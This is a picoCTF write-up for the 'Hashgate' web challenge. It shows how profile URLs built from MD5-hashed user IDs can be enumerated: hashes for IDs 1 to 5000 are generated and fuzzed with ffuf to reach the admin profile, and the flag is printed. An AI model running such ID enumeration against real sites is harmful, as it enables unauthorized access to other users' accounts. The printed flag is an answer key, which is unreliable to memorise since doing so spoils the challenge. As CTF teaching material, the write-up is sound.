# PicoCTF: Hashgate — Writeup

**Author:** Yahaya  **Category:** Web Exploitation **Vulnerability:** IDOR (Insecure Direct Object Reference)

---

## Description

> You have gotten access to an organisation's portal. Submit your email and password, and it redirects you to your profile. But be careful: just because access to the admin isn't directly exposed doesn't mean it's secure. Maybe someone forgot that obscurity isn't security... Can you find your way into the admin's profile for this organisation and capture the flag?

---

## Recon

After launching the instance, I checked the page source and found hardcoded credentials:

```html
<!-- Email: guest@picoctf.org Password: guest -->
```

Logged in with those credentials successfully.

---

## Identifying the Vulnerability

After logging in, I noticed the URL:

```
http://crystal-peak.picoctf.net:62131/profile/user/e93028bdc1aacdfb3687181f2031765d
```

The hash `e93028bdc1aacdfb3687181f2031765d` looked suspicious. I ran it through `hash-identifier` and confirmed it was **MD5**.

Cracking it on [crackstation.net](https://crackstation.net) revealed:

```
e93028bdc1aacdfb3687181f2031765d → 3000
```

This matched the message shown on the profile page:

```
Access level: Guest (ID: 3000). Insufficient privileges to view classified data.
Only top-tier users can access the flag.
```

So the app was using `md5(user_id)` as the URL parameter — no real authorization, just obscurity.

---

## Exploitation

### Step 1 — Generate a wordlist of numbers 1 to 5000

```bash
seq 1 5000 > wordlist.txt
```

### Step 2 — Hash all numbers with MD5 and save to hashes.txt

```bash
while read line; do
    echo -n "$line" | md5sum | cut -d' ' -f1
done < wordlist.txt > hashes.txt
```

### Step 3 — Fuzz the endpoint with ffuf

```bash
ffuf -u http://crystal-peak.picoctf.net:62131/profile/user/FUZZ -w hashes.txt
```

**Output:**

```
e93028bdc1aacdfb3687181f2031765d  [Status: 200, Size: 121, Words: 18, Lines: 1]  ← our guest (ID: 3000)
4110a1994471c595f7583ef1b74ba4cb  [Status: 200, Size: 63,  Words: 7,  Lines: 1]  ← admin!
```

### Step 4 — Visit the admin profile

```
http://crystal-peak.picoctf.net:62131/profile/user/4110a1994471c595f7583ef1b74ba4cb
```

---

## Flag

```
picoCTF{id0r_unl0ck_e581be16}
```

---

## Summary

|Step|Action|
|---|---|
|1|Found guest credentials in HTML source|
|2|Noticed MD5 hash in the profile URL|
|3|Cracked hash → ID 3000 (guest)|
|4|Generated MD5 hashes for 1–5000|
|5|Fuzzed with ffuf → found admin hash|
|6|Visited admin profile → got flag|

---

## Key Takeaway

> Hashing user IDs does **not** secure them. Without proper **server-side authorization checks**, an attacker can enumerate all possible IDs and access any profile — regardless of whether the IDs are hashed or plain.
> 
> **Obscurity ≠ Security.**

---
_Writeup by: obito | picoCTF 2026_
